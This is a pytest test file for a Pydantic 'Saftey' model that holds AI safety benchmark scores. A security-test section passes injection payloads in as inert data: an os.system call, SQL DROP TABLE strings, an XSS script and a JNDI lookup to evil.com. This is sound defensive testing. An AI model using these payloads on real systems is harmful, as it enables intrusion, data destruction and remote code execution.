"""
MIT License
https://mit-license.org/
Copyright © 2025 Infosys Ltd.

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
"""

import pytest
import sys
import os
from typing import Dict, Any
from pydantic import ValidationError
import json

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))
from dao.mappers.saftey import Saftey


# ==================== FIXTURES ====================

@pytest.fixture
def valid_saftey_data():
    """Fixture providing valid safety data"""
    return {
        "model_name": "gpt-4",
        "jailbreak": "0.85",
        "toxicity": "0.90",
        "misuse": "0.88",
        "exaggerated_safety": "0.92",
        "overall": "0.894",
        "inhouse_model": False
    }


@pytest.fixture
def saftey_instance(valid_saftey_data):
    """Fixture providing a Saftey instance"""
    return Saftey(**valid_saftey_data)


@pytest.fixture
def minimal_saftey_data():
    """Fixture with minimal valid data"""
    return {
        "model_name": "test-model",
        "jailbreak": "0.0",
        "toxicity": "0.0",
        "misuse": "0.0",
        "exaggerated_safety": "0.0",
        "overall": "0.0"
    }


@pytest.fixture
def inhouse_model_data():
    """Fixture for inhouse model testing"""
    return {
        "model_name": "custom-inhouse-model",
        "jailbreak": "0.95",
        "toxicity": "0.93",
        "misuse": "0.91",
        "exaggerated_safety": "0.96",
        "overall": "0.943",
        "inhouse_model": True
    }


# ==================== FUNCTIONAL CORRECTNESS TESTS ====================

class TestSafteyFunctionalCorrectness:
    """Test functional correctness of Saftey model"""
    
    def test_create_saftey_with_all_fields(self, valid_saftey_data):
        """Test creating Saftey instance with all fields"""
        saftey = Saftey(**valid_saftey_data)
        
        assert saftey.model_name == "gpt-4"
        assert saftey.jailbreak == "0.85"
        assert saftey.toxicity == "0.90"
        assert saftey.misuse == "0.88"
        assert saftey.exaggerated_safety == "0.92"
        assert saftey.overall == "0.894"
        assert saftey.inhouse_model is False
    
    def test_create_saftey_without_optional_inhouse_model(self, minimal_saftey_data):
        """Test creating Saftey instance without optional inhouse_model"""
        saftey = Saftey(**minimal_saftey_data)
        
        assert saftey.inhouse_model is False  # Default value
        assert saftey.model_name == "test-model"
    
    def test_all_score_fields_are_strings(self, valid_saftey_data):
        """Test that all score fields are stored as strings"""
        saftey = Saftey(**valid_saftey_data)
        
        assert isinstance(saftey.model_name, str)
        assert isinstance(saftey.jailbreak, str)
        assert isinstance(saftey.toxicity, str)
        assert isinstance(saftey.misuse, str)
        assert isinstance(saftey.exaggerated_safety, str)
        assert isinstance(saftey.overall, str)
    
    def test_inhouse_model_field_is_boolean(self, valid_saftey_data):
        """Test that inhouse_model is a boolean"""
        saftey = Saftey(**valid_saftey_data)
        
        assert isinstance(saftey.inhouse_model, bool)
    
    def test_inhouse_model_true(self, inhouse_model_data):
        """Test setting inhouse_model to True"""
        saftey = Saftey(**inhouse_model_data)
        
        assert saftey.inhouse_model is True
        assert saftey.model_name == "custom-inhouse-model"
    
    def test_inhouse_model_false(self, valid_saftey_data):
        """Test setting inhouse_model to False"""
        saftey = Saftey(**valid_saftey_data)
        
        assert saftey.inhouse_model is False
    
    def test_inhouse_model_default_value(self, minimal_saftey_data):
        """Test that inhouse_model has default value of False"""
        saftey = Saftey(**minimal_saftey_data)
        
        assert saftey.inhouse_model is False
    
    def test_model_name_field_variations(self, valid_saftey_data):
        """Test various model_name values"""
        model_names = [
            "gpt-4",
            "claude-3-opus",
            "llama-2-70b",
            "custom_model_v1",
            "Model-2024",
            "AI-Safety-Model"
        ]
        
        for model_name in model_names:
            valid_saftey_data["model_name"] = model_name
            saftey = Saftey(**valid_saftey_data)
            assert saftey.model_name == model_name
    
    def test_jailbreak_field(self, valid_saftey_data):
        """Test jailbreak field"""
        test_values = ["0.0", "0.5", "0.999", "1.0"]
        
        for value in test_values:
            valid_saftey_data["jailbreak"] = value
            saftey = Saftey(**valid_saftey_data)
            assert saftey.jailbreak == value
    
    def test_toxicity_field(self, valid_saftey_data):
        """Test toxicity field"""
        test_values = ["0.1", "0.45", "0.89", "1.0"]
        
        for value in test_values:
            valid_saftey_data["toxicity"] = value
            saftey = Saftey(**valid_saftey_data)
            assert saftey.toxicity == value
    
    def test_misuse_field(self, valid_saftey_data):
        """Test misuse field"""
        test_values = ["0.2", "0.55", "0.88"]
        
        for value in test_values:
            valid_saftey_data["misuse"] = value
            saftey = Saftey(**valid_saftey_data)
            assert saftey.misuse == value
    
    def test_exaggerated_safety_field(self, valid_saftey_data):
        """Test exaggerated_safety field"""
        test_values = ["0.0", "0.33", "0.67", "1.0"]
        
        for value in test_values:
            valid_saftey_data["exaggerated_safety"] = value
            saftey = Saftey(**valid_saftey_data)
            assert saftey.exaggerated_safety == value
    
    def test_overall_field(self, valid_saftey_data):
        """Test overall field"""
        test_values = ["0.0", "0.123", "0.888", "1.0"]
        
        for value in test_values:
            valid_saftey_data["overall"] = value
            saftey = Saftey(**valid_saftey_data)
            assert saftey.overall == value


# ==================== EDGE CASES TESTS ====================

class TestSafteyEdgeCases:
    """Test edge cases for Saftey model"""
    
    def test_empty_string_score_values(self, valid_saftey_data):
        """Test that empty strings are accepted for score fields"""
        valid_saftey_data["jailbreak"] = ""
        valid_saftey_data["overall"] = ""
        
        saftey = Saftey(**valid_saftey_data)
        
        assert saftey.jailbreak == ""
        assert saftey.overall == ""
    
    def test_very_long_string_values(self, valid_saftey_data):
        """Test handling of very long string values"""
        long_value = "0." + "1234567890" * 100
        valid_saftey_data["overall"] = long_value
        
        saftey = Saftey(**valid_saftey_data)
        
        assert saftey.overall == long_value
        assert len(saftey.overall) > 1000
    
    def test_special_characters_in_score_fields(self, valid_saftey_data):
        """Test special characters in score fields"""
        special_values = [
            "0.85%",
            "N/A",
            "null",
            "-0.5",
            "+0.95",
            "0,85"
        ]
        
        for value in special_values:
            valid_saftey_data["jailbreak"] = value
            saftey = Saftey(**valid_saftey_data)
            assert saftey.jailbreak == value
    
    def test_whitespace_in_strings(self, valid_saftey_data):
        """Test handling of whitespace in string fields"""
        valid_saftey_data["model_name"] = "  model with spaces  "
        valid_saftey_data["overall"] = " 0.85 "
        
        saftey = Saftey(**valid_saftey_data)
        
        assert saftey.model_name == "  model with spaces  "
        assert saftey.overall == " 0.85 "
    
    def test_zero_values(self, valid_saftey_data):
        """Test zero values for score fields"""
        valid_saftey_data["jailbreak"] = "0"
        valid_saftey_data["toxicity"] = "0.0"
        valid_saftey_data["overall"] = "0.00"
        
        saftey = Saftey(**valid_saftey_data)
        
        assert saftey.jailbreak == "0"
        assert saftey.toxicity == "0.0"
        assert saftey.overall == "0.00"
    
    def test_very_large_score_values(self, valid_saftey_data):
        """Test very large numeric string values"""
        valid_saftey_data["overall"] = "999999.999999"
        
        saftey = Saftey(**valid_saftey_data)
        
        assert saftey.overall == "999999.999999"
    
    def test_negative_score_values(self, valid_saftey_data):
        """Test negative score values"""
        valid_saftey_data["jailbreak"] = "-0.5"
        valid_saftey_data["overall"] = "-100"
        
        saftey = Saftey(**valid_saftey_data)
        
        assert saftey.jailbreak == "-0.5"
        assert saftey.overall == "-100"
    
    def test_unicode_characters_in_model_name(self, valid_saftey_data):
        """Test unicode characters in model_name"""
        unicode_names = [
            "模型-GPT-4",
            "Модель-Safety",
            "モデル-AI",
            "🤖-Safety-Model",
            "Model™®©"
        ]
        
        for name in unicode_names:
            valid_saftey_data["model_name"] = name
            saftey = Saftey(**valid_saftey_data)
            assert saftey.model_name == name
    
    def test_single_character_model_name(self, valid_saftey_data):
        """Test single character model name"""
        valid_saftey_data["model_name"] = "A"
        
        saftey = Saftey(**valid_saftey_data)
        
        assert saftey.model_name == "A"
    
    def test_very_long_model_name(self, valid_saftey_data):
        """Test very long model name"""
        long_name = "model_" * 1000
        valid_saftey_data["model_name"] = long_name
        
        saftey = Saftey(**valid_saftey_data)
        
        assert saftey.model_name == long_name
        assert len(saftey.model_name) >= 6000
    
    def test_numeric_string_formats(self, valid_saftey_data):
        """Test various numeric string formats"""
        formats = [
            "0.5",
            ".5",
            "0.500",
            "0.5000000",
            "5e-1",
            "5E-1"
        ]
        
        for fmt in formats:
            valid_saftey_data["jailbreak"] = fmt
            saftey = Saftey(**valid_saftey_data)
            assert saftey.jailbreak == fmt


# ==================== ERROR HANDLING & VALIDATION TESTS ====================

class TestSafteyErrorHandling:
    """Test error handling and validation"""
    
    def test_missing_required_model_name(self, valid_saftey_data):
        """Test that missing model_name raises ValidationError"""
        del valid_saftey_data["model_name"]
        
        with pytest.raises(ValidationError) as exc_info:
            Saftey(**valid_saftey_data)
        
        assert "model_name" in str(exc_info.value)
        assert "Field required" in str(exc_info.value)
    
    def test_missing_required_jailbreak(self, valid_saftey_data):
        """Test that missing jailbreak raises ValidationError"""
        del valid_saftey_data["jailbreak"]
        
        with pytest.raises(ValidationError) as exc_info:
            Saftey(**valid_saftey_data)
        
        assert "jailbreak" in str(exc_info.value)
    
    def test_missing_required_toxicity(self, valid_saftey_data):
        """Test that missing toxicity raises ValidationError"""
        del valid_saftey_data["toxicity"]
        
        with pytest.raises(ValidationError) as exc_info:
            Saftey(**valid_saftey_data)
        
        assert "toxicity" in str(exc_info.value)
    
    def test_missing_required_misuse(self, valid_saftey_data):
        """Test that missing misuse raises ValidationError"""
        del valid_saftey_data["misuse"]
        
        with pytest.raises(ValidationError) as exc_info:
            Saftey(**valid_saftey_data)
        
        assert "misuse" in str(exc_info.value)
    
    def test_missing_required_exaggerated_safety(self, valid_saftey_data):
        """Test that missing exaggerated_safety raises ValidationError"""
        del valid_saftey_data["exaggerated_safety"]
        
        with pytest.raises(ValidationError) as exc_info:
            Saftey(**valid_saftey_data)
        
        assert "exaggerated_safety" in str(exc_info.value)
    
    def test_missing_required_overall(self, valid_saftey_data):
        """Test that missing overall raises ValidationError"""
        del valid_saftey_data["overall"]
        
        with pytest.raises(ValidationError) as exc_info:
            Saftey(**valid_saftey_data)
        
        assert "overall" in str(exc_info.value)
    
    def test_missing_optional_inhouse_model(self, valid_saftey_data):
        """Test that missing inhouse_model uses default value"""
        del valid_saftey_data["inhouse_model"]
        
        saftey = Saftey(**valid_saftey_data)
        
        assert saftey.inhouse_model is False
    
    def test_none_value_for_required_field(self, valid_saftey_data):
        """Test that None value for required field raises ValidationError"""
        valid_saftey_data["model_name"] = None
        
        with pytest.raises(ValidationError) as exc_info:
            Saftey(**valid_saftey_data)
        
        assert "model_name" in str(exc_info.value)
    
    def test_none_value_for_score_field(self, valid_saftey_data):
        """Test that None value for score field raises ValidationError"""
        valid_saftey_data["jailbreak"] = None
        
        with pytest.raises(ValidationError) as exc_info:
            Saftey(**valid_saftey_data)
        
        assert "jailbreak" in str(exc_info.value)
    
    def test_none_value_for_optional_inhouse_model(self, valid_saftey_data):
        """Test that None value for optional inhouse_model is accepted"""
        valid_saftey_data["inhouse_model"] = None
        
        # Since inhouse_model is Optional[bool], None should be accepted
        saftey = Saftey(**valid_saftey_data)
        
        # None should be preserved
        assert saftey.inhouse_model is None
    
    def test_invalid_type_for_inhouse_model(self, valid_saftey_data):
        """Test that invalid type for inhouse_model raises ValidationError"""
        valid_saftey_data["inhouse_model"] = "not_a_boolean"
        
        with pytest.raises(ValidationError) as exc_info:
            Saftey(**valid_saftey_data)
        
        assert "inhouse_model" in str(exc_info.value)
        assert "bool_parsing" in str(exc_info.value)
    
    def test_numeric_inhouse_model_values(self, valid_saftey_data):
        """Test numeric values for inhouse_model field"""
        valid_saftey_data["inhouse_model"] = 0
        saftey1 = Saftey(**valid_saftey_data)
        assert saftey1.inhouse_model is False
        
        valid_saftey_data["inhouse_model"] = 1
        saftey2 = Saftey(**valid_saftey_data)
        assert saftey2.inhouse_model is True
    
    def test_empty_dict_initialization(self):
        """Test that empty dict raises ValidationError"""
        with pytest.raises(ValidationError) as exc_info:
            Saftey()
        
        errors = str(exc_info.value)
        assert "model_name" in errors
        assert "jailbreak" in errors
        assert "overall" in errors
    
    def test_extra_fields_handling(self, valid_saftey_data):
        """Test handling of extra fields not in model"""
        valid_saftey_data["extra_field"] = "extra_value"
        valid_saftey_data["another_field"] = 123
        
        # By default, Pydantic ignores extra fields
        saftey = Saftey(**valid_saftey_data)
        
        assert not hasattr(saftey, "extra_field")
        assert not hasattr(saftey, "another_field")
    
    def test_multiple_missing_fields(self):
        """Test that multiple missing fields are reported"""
        incomplete_data = {
            "model_name": "test-model"
            # All other required fields missing
        }
        
        with pytest.raises(ValidationError) as exc_info:
            Saftey(**incomplete_data)
        
        error_str = str(exc_info.value)
        assert "jailbreak" in error_str
        assert "overall" in error_str


# ==================== SERIALIZATION & DESERIALIZATION TESTS ====================

class TestSafteySerialization:
    """Test serialization and deserialization"""
    
    def test_model_dump(self, saftey_instance):
        """Test converting Saftey instance to dictionary"""
        data = saftey_instance.model_dump()
        
        assert isinstance(data, dict)
        assert data["model_name"] == "gpt-4"
        assert data["jailbreak"] == "0.85"
        assert data["inhouse_model"] is False
        assert len(data) == 7  # All 7 fields
    
    def test_model_dump_json(self, saftey_instance):
        """Test converting Saftey instance to JSON string"""
        json_str = saftey_instance.model_dump_json()
        
        assert isinstance(json_str, str)
        assert "gpt-4" in json_str
        assert "0.85" in json_str
        
        # Verify it's valid JSON
        parsed = json.loads(json_str)
        assert parsed["model_name"] == "gpt-4"
    
    def test_model_dump_exclude_fields(self, saftey_instance):
        """Test excluding fields during serialization"""
        data = saftey_instance.model_dump(exclude={"inhouse_model", "overall"})
        
        assert "model_name" in data
        assert "jailbreak" in data
        assert "inhouse_model" not in data
        assert "overall" not in data
    
    def test_model_dump_include_fields(self, saftey_instance):
        """Test including only specific fields during serialization"""
        data = saftey_instance.model_dump(include={"model_name", "overall", "inhouse_model"})
        
        assert "model_name" in data
        assert "overall" in data
        assert "inhouse_model" in data
        assert "jailbreak" not in data
    
    def test_json_deserialization(self, valid_saftey_data):
        """Test creating Saftey from JSON string"""
        json_str = json.dumps(valid_saftey_data)
        saftey = Saftey.model_validate_json(json_str)
        
        assert saftey.model_name == valid_saftey_data["model_name"]
        assert saftey.overall == valid_saftey_data["overall"]
    
    def test_dict_deserialization(self, valid_saftey_data):
        """Test creating Saftey from dictionary"""
        saftey = Saftey.model_validate(valid_saftey_data)
        
        assert saftey.model_name == valid_saftey_data["model_name"]
        assert saftey.jailbreak == valid_saftey_data["jailbreak"]
    
    def test_roundtrip_serialization(self, saftey_instance):
        """Test that serialization and deserialization preserve data"""
        # Serialize to dict
        data = saftey_instance.model_dump()
        
        # Deserialize back
        saftey_copy = Saftey(**data)
        
        # Compare all fields
        assert saftey_copy.model_name == saftey_instance.model_name
        assert saftey_copy.jailbreak == saftey_instance.jailbreak
        assert saftey_copy.toxicity == saftey_instance.toxicity
        assert saftey_copy.misuse == saftey_instance.misuse
        assert saftey_copy.exaggerated_safety == saftey_instance.exaggerated_safety
        assert saftey_copy.overall == saftey_instance.overall
        assert saftey_copy.inhouse_model == saftey_instance.inhouse_model
    
    def test_json_roundtrip(self, saftey_instance):
        """Test JSON serialization and deserialization roundtrip"""
        json_str = saftey_instance.model_dump_json()
        saftey_copy = Saftey.model_validate_json(json_str)
        
        assert saftey_copy.model_name == saftey_instance.model_name
        assert saftey_copy.overall == saftey_instance.overall
        assert saftey_copy.inhouse_model == saftey_instance.inhouse_model


# ==================== EQUALITY & COMPARISON TESTS ====================

class TestSafteyEquality:
    """Test equality and comparison operations"""
    
    def test_equality_same_values(self, valid_saftey_data):
        """Test that two Saftey instances with same values are equal"""
        saftey1 = Saftey(**valid_saftey_data)
        saftey2 = Saftey(**valid_saftey_data)
        
        assert saftey1 == saftey2
    
    def test_inequality_different_model_name(self, valid_saftey_data):
        """Test that Saftey instances with different model_name are not equal"""
        saftey1 = Saftey(**valid_saftey_data)
        
        valid_saftey_data["model_name"] = "different-model"
        saftey2 = Saftey(**valid_saftey_data)
        
        assert saftey1 != saftey2
    
    def test_inequality_different_score(self, valid_saftey_data):
        """Test that Saftey instances with different score are not equal"""
        saftey1 = Saftey(**valid_saftey_data)
        
        valid_saftey_data["overall"] = "0.99"
        saftey2 = Saftey(**valid_saftey_data)
        
        assert saftey1 != saftey2
    
    def test_inequality_different_inhouse_model(self, valid_saftey_data):
        """Test that Saftey instances with different inhouse_model are not equal"""
        valid_saftey_data["inhouse_model"] = False
        saftey1 = Saftey(**valid_saftey_data)
        
        valid_saftey_data["inhouse_model"] = True
        saftey2 = Saftey(**valid_saftey_data)
        
        assert saftey1 != saftey2


# ==================== IMMUTABILITY & STATE TESTS ====================

class TestSafteyImmutability:
    """Test immutability and state management"""
    
    def test_field_modification(self, saftey_instance):
        """Test that fields can be modified"""
        original_name = saftey_instance.model_name
        saftey_instance.model_name = "new-model"
        
        assert saftey_instance.model_name == "new-model"
        assert saftey_instance.model_name != original_name
    
    def test_score_field_reassignment(self, saftey_instance):
        """Test that score fields can be reassigned"""
        saftey_instance.overall = "0.95"
        
        assert isinstance(saftey_instance.overall, str)
        assert saftey_instance.overall == "0.95"
    
    def test_inhouse_model_toggle(self, saftey_instance):
        """Test toggling inhouse_model field"""
        original_value = saftey_instance.inhouse_model
        saftey_instance.inhouse_model = not original_value
        
        assert saftey_instance.inhouse_model != original_value
    
    def test_multiple_field_modifications(self, saftey_instance):
        """Test modifying multiple fields"""
        saftey_instance.jailbreak = "0.99"
        saftey_instance.toxicity = "0.98"
        saftey_instance.overall = "0.985"
        
        assert saftey_instance.jailbreak == "0.99"
        assert saftey_instance.toxicity == "0.98"
        assert saftey_instance.overall == "0.985"


# ==================== PERFORMANCE TESTS ====================

class TestSafteyPerformance:
    """Test performance characteristics"""
    
    def test_instantiation_performance(self, valid_saftey_data):
        """Test that Saftey instantiation is fast"""
        import time
        
        start_time = time.time()
        for _ in range(1000):
            Saftey(**valid_saftey_data)
        end_time = time.time()
        
        # 1000 instantiations should complete quickly
        assert (end_time - start_time) < 1.0
    
    def test_serialization_performance(self, saftey_instance):
        """Test that serialization is fast"""
        import time
        
        start_time = time.time()
        for _ in range(1000):
            saftey_instance.model_dump()
        end_time = time.time()
        
        # 1000 serializations should complete quickly
        assert (end_time - start_time) < 0.5
    
    def test_validation_performance(self, valid_saftey_data):
        """Test that validation is fast"""
        import time
        
        start_time = time.time()
        for _ in range(1000):
            Saftey.model_validate(valid_saftey_data)
        end_time = time.time()
        
        # 1000 validations should complete quickly
        assert (end_time - start_time) < 1.0


# ==================== CODE QUALITY & STRUCTURE TESTS ====================

class TestSafteyCodeQuality:
    """Test code quality and structure"""
    
    def test_saftey_is_pydantic_basemodel(self):
        """Test that Saftey inherits from BaseModel"""
        from pydantic import BaseModel
        assert issubclass(Saftey, BaseModel)
    
    def test_all_required_fields_present(self):
        """Test that all expected fields are defined"""
        fields = Saftey.model_fields
        
        assert "model_name" in fields
        assert "jailbreak" in fields
        assert "toxicity" in fields
        assert "misuse" in fields
        assert "exaggerated_safety" in fields
        assert "overall" in fields
        assert "inhouse_model" in fields
    
    def test_field_count(self):
        """Test that model has exactly 7 fields"""
        fields = Saftey.model_fields
        assert len(fields) == 7
    
    def test_field_types(self):
        """Test that fields have correct type annotations"""
        from typing import get_origin
        fields = Saftey.model_fields
        
        # String fields
        assert fields["model_name"].annotation == str
        assert fields["jailbreak"].annotation == str
        assert fields["toxicity"].annotation == str
        assert fields["misuse"].annotation == str
        assert fields["exaggerated_safety"].annotation == str
        assert fields["overall"].annotation == str
        
        # Optional bool field - check it's Optional[bool]
        inhouse_annotation = fields["inhouse_model"].annotation
        # In Python 3.10+, Optional[bool] is Union[bool, None]
        assert get_origin(inhouse_annotation) is type(None) or str(inhouse_annotation) == "Optional[bool]" or "bool" in str(inhouse_annotation)
    
    def test_inhouse_model_has_default(self):
        """Test that inhouse_model has default value"""
        fields = Saftey.model_fields
        
        assert not fields["inhouse_model"].is_required()
        assert fields["inhouse_model"].default == False
    
    def test_required_fields_no_default(self):
        """Test that required fields have no default value"""
        fields = Saftey.model_fields
        
        required_fields = [
            "model_name", "jailbreak", "toxicity",
            "misuse", "exaggerated_safety", "overall"
        ]
        
        for field_name in required_fields:
            assert fields[field_name].is_required(), f"Field {field_name} should be required"
    
    def test_saftey_has_string_representation(self, saftey_instance):
        """Test that Saftey instance has string representation"""
        str_repr = str(saftey_instance)
        
        assert isinstance(str_repr, str)
        assert len(str_repr) > 0
    
    def test_saftey_has_repr(self, saftey_instance):
        """Test that Saftey instance has repr"""
        repr_str = repr(saftey_instance)
        
        assert isinstance(repr_str, str)
        assert "Saftey" in repr_str


# ==================== PARAMETRIZED TESTS ====================

class TestSafteyParametrized:
    """Parametrized tests for comprehensive coverage"""
    
    @pytest.mark.parametrize("field_name,field_value", [
        ("jailbreak", "0.1"),
        ("jailbreak", "0.999999"),
        ("toxicity", "0.0"),
        ("toxicity", "1.0"),
        ("misuse", "0.5"),
        ("exaggerated_safety", "0.75"),
        ("overall", "0.5"),
    ])
    def test_various_score_values(self, valid_saftey_data, field_name, field_value):
        """Test various score values for different fields"""
        valid_saftey_data[field_name] = field_value
        saftey = Saftey(**valid_saftey_data)
        
        assert getattr(saftey, field_name) == field_value
    
    @pytest.mark.parametrize("model_name", [
        "gpt-3.5-turbo",
        "gpt-4",
        "claude-2",
        "claude-3-opus",
        "llama-2-7b",
        "llama-2-70b",
        "mistral-7b",
        "gemini-pro",
        "custom-safety-model",
        "inhouse-model-v2",
    ])
    def test_various_model_names(self, valid_saftey_data, model_name):
        """Test various common model names"""
        valid_saftey_data["model_name"] = model_name
        saftey = Saftey(**valid_saftey_data)
        
        assert saftey.model_name == model_name
    
    @pytest.mark.parametrize("inhouse_value,expected", [
        (True, True),
        (False, False),
        (1, True),
        (0, False),
        ("true", True),
        ("false", False),
    ])
    def test_various_inhouse_model_values(self, valid_saftey_data, inhouse_value, expected):
        """Test various inhouse_model values and their coercion"""
        valid_saftey_data["inhouse_model"] = inhouse_value
        saftey = Saftey(**valid_saftey_data)
        
        assert saftey.inhouse_model == expected
    
    @pytest.mark.parametrize("missing_field", [
        "model_name",
        "jailbreak",
        "toxicity",
        "misuse",
        "exaggerated_safety",
        "overall",
    ])
    def test_missing_required_fields(self, valid_saftey_data, missing_field):
        """Test that missing any required field raises ValidationError"""
        del valid_saftey_data[missing_field]
        
        with pytest.raises(ValidationError) as exc_info:
            Saftey(**valid_saftey_data)
        
        assert missing_field in str(exc_info.value)


# ==================== INTEGRATION TESTS ====================

class TestSafteyIntegration:
    """Test integration with external systems"""
    
    def test_json_compatibility(self, saftey_instance):
        """Test that Saftey can be serialized to standard JSON"""
        json_str = saftey_instance.model_dump_json()
        
        # Should be parseable by standard json module
        data = json.loads(json_str)
        assert isinstance(data, dict)
        assert data["model_name"] == saftey_instance.model_name
    
    def test_dict_compatibility(self, saftey_instance):
        """Test that Saftey works with dict operations"""
        data = saftey_instance.model_dump()
        
        # Should support dict operations
        assert "model_name" in data
        assert list(data.keys())
        assert list(data.values())
    
    def test_database_ready_format(self, saftey_instance):
        """Test that Saftey output is ready for database storage"""
        data = saftey_instance.model_dump()
        
        # All values should be JSON-serializable types
        json_str = json.dumps(data)
        assert isinstance(json_str, str)
        
        # Should be able to parse back
        parsed = json.loads(json_str)
        assert parsed == data
    
    def test_batch_processing_simulation(self, valid_saftey_data):
        """Test creating multiple Saftey instances for batch processing"""
        instances = []
        
        for i in range(10):
            data = valid_saftey_data.copy()
            data["model_name"] = f"model-{i}"
            data["overall"] = f"0.{i}{i}"
            instances.append(Saftey(**data))
        
        assert len(instances) == 10
        assert instances[0].model_name == "model-0"
        assert instances[9].model_name == "model-9"


# ==================== REGRESSION TESTS ====================

class TestSafteyRegression:
    """Test for regression and backward compatibility"""
    
    def test_typo_in_class_name(self):
        """Test that the class name 'Saftey' (typo) is preserved"""
        # This tests that the typo in the class name is maintained for backward compatibility
        assert Saftey.__name__ == "Saftey"
        assert "Saftey" in str(Saftey)
    
    def test_backwards_compatible_with_old_data(self):
        """Test that model works with legacy data format"""
        legacy_data = {
            "model_name": "legacy-model",
            "jailbreak": "0.8",
            "toxicity": "0.85",
            "misuse": "0.82",
            "exaggerated_safety": "0.88",
            "overall": "0.852",
            "inhouse_model": False
        }
        
        saftey = Saftey(**legacy_data)
        
        assert saftey.model_name == "legacy-model"
        assert saftey.inhouse_model is False
    
    def test_backwards_compatible_without_inhouse_model(self):
        """Test that model works without inhouse_model field (uses default)"""
        legacy_data = {
            "model_name": "legacy-model",
            "jailbreak": "0.8",
            "toxicity": "0.85",
            "misuse": "0.82",
            "exaggerated_safety": "0.88",
            "overall": "0.852"
        }
        
        saftey = Saftey(**legacy_data)
        
        assert saftey.model_name == "legacy-model"
        assert saftey.inhouse_model is False  # Default value
    
    def test_all_fields_have_correct_types(self, valid_saftey_data):
        """Regression test to ensure field types are correct"""
        saftey = Saftey(**valid_saftey_data)
        
        # Verify string fields
        for field_name in ["model_name", "jailbreak", "toxicity",
                          "misuse", "exaggerated_safety", "overall"]:
            value = getattr(saftey, field_name)
            assert isinstance(value, str), f"Field {field_name} should be string, got {type(value)}"
        
        # Verify boolean field
        assert isinstance(saftey.inhouse_model, bool)


# ==================== SECURITY TESTS ====================

class TestSafteySecurity:
    """Test security aspects"""
    
    def test_no_code_injection_in_model_name(self, valid_saftey_data):
        """Test that model_name with code-like strings is treated as string"""
        malicious_names = [
            "__import__('os').system('ls')",
            "'; DROP TABLE saftey; --",
            "<script>alert('xss')</script>",
            "${jndi:ldap://evil.com/a}",
        ]
        
        for name in malicious_names:
            valid_saftey_data["model_name"] = name
            saftey = Saftey(**valid_saftey_data)
            # Should just store as string, not execute
            assert saftey.model_name == name
            assert isinstance(saftey.model_name, str)
    
    def test_no_code_injection_in_score_fields(self, valid_saftey_data):
        """Test that score fields with malicious strings are treated as strings"""
        valid_saftey_data["overall"] = "exec('malicious code')"
        
        saftey = Saftey(**valid_saftey_data)
        
        # Should just store as string, not execute
        assert saftey.overall == "exec('malicious code')"
        assert isinstance(saftey.overall, str)
    
    def test_sql_injection_patterns(self, valid_saftey_data):
        """Test various SQL injection patterns"""
        sql_patterns = [
            "1' OR '1'='1",
            "'; DROP TABLE users; --",
            "admin'--",
            "' UNION SELECT * FROM users--",
        ]
        
        for pattern in sql_patterns:
            valid_saftey_data["model_name"] = pattern
            saftey = Saftey(**valid_saftey_data)
            assert saftey.model_name == pattern


# ==================== SCALABILITY TESTS ====================

class TestSafteyScalability:
    """Test scalability aspects"""
    
    def test_handle_multiple_instances(self, valid_saftey_data):
        """Test creating multiple Saftey instances"""
        instances = []
        
        for i in range(100):
            data = valid_saftey_data.copy()
            data["model_name"] = f"model-{i}"
            data["overall"] = f"0.{i:02d}"
            instances.append(Saftey(**data))
        
        assert len(instances) == 100
        assert instances[0].model_name == "model-0"
        assert instances[99].model_name == "model-99"
    
    def test_memory_efficiency_with_many_instances(self, valid_saftey_data):
        """Test memory efficiency with many instances"""
        instances = []
        
        for i in range(1000):
            data = valid_saftey_data.copy()
            data["model_name"] = f"model-{i}"
            instances.append(Saftey(**data))
        
        # All instances should be created successfully
        assert len(instances) == 1000
    
    def test_large_batch_serialization(self, valid_saftey_data):
        """Test serializing many instances"""
        instances = [Saftey(**valid_saftey_data) for _ in range(100)]
        
        serialized = [inst.model_dump() for inst in instances]
        
        assert len(serialized) == 100
        assert all(isinstance(item, dict) for item in serialized)


# ==================== FIELD-SPECIFIC TESTS ====================

class TestSafteyFieldSpecific:
    """Test specific behaviors of individual fields"""
    
    def test_safety_metric_fields_independence(self, valid_saftey_data):
        """Test that all safety metric fields are independent"""
        valid_saftey_data["jailbreak"] = "0.9"
        valid_saftey_data["toxicity"] = "0.85"
        valid_saftey_data["misuse"] = "0.88"
        valid_saftey_data["exaggerated_safety"] = "0.92"
        
        saftey = Saftey(**valid_saftey_data)
        
        # All safety fields should be present and independent
        assert saftey.jailbreak == "0.9"
        assert saftey.toxicity == "0.85"
        assert saftey.misuse == "0.88"
        assert saftey.exaggerated_safety == "0.92"
    
    def test_overall_vs_individual_scores(self, valid_saftey_data):
        """Test that overall score can differ from individual scores"""
        valid_saftey_data["jailbreak"] = "0.5"
        valid_saftey_data["toxicity"] = "0.8"
        valid_saftey_data["overall"] = "0.65"  # Aggregate
        
        saftey = Saftey(**valid_saftey_data)
        
        # Overall can be different from individual scores
        assert saftey.overall == "0.65"
        assert saftey.jailbreak == "0.5"
    
    def test_inhouse_model_flag_independence(self, valid_saftey_data):
        """Test that inhouse_model flag doesn't affect score fields"""
        valid_saftey_data["inhouse_model"] = True
        saftey1 = Saftey(**valid_saftey_data)
        
        valid_saftey_data["inhouse_model"] = False
        saftey2 = Saftey(**valid_saftey_data)
        
        # Score fields should be same regardless of inhouse_model
        assert saftey1.overall == saftey2.overall
        assert saftey1.jailbreak == saftey2.jailbreak
        # But inhouse_model should differ
        assert saftey1.inhouse_model != saftey2.inhouse_model
    
    def test_jailbreak_detection_field(self, valid_saftey_data):
        """Test jailbreak field represents detection capability"""
        # Higher values typically indicate better jailbreak detection
        valid_saftey_data["jailbreak"] = "0.95"
